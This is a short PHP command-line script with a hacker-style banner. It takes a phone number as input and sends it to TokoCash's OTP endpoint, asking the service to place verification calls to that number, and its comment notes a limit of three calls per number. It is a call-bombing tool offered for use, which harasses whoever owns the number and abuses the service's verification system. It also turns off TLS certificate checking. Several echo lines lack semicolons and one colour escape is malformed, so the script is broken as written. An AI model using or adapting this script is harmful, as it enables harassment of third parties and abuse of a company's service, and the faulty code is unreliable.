<?php
// Limit 3x Telpon Setiap Satu Nomor
function send($phone){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
        curl_close($ch);
                echo $asw."\n";
}
echo "\33[32;1m               ___   ___   _  _   "
echo "\33[36;1m               | __| | _ ) | || |  *AsecC|~|eror404"
echo "\33;36;1m               | _|  | _ \ | __ |  "
echo "\33[32;1m              _|_|_  |___/ |_||_|  "
echo '\33[31;1m        |"""""|| """ |HaxID|"""""||"""""| '
echo "\33[36;1m            *-0-0-***-0-0-***-0-0-*   "
echo ""
echo "COPYRIGHT ; SGBTEAM\n\n";
echo "\33[36;1mNomor\nInput : ";
$nomor = trim(fgets(STDIN));
$execute = send($nomor);
print $execute;
?>
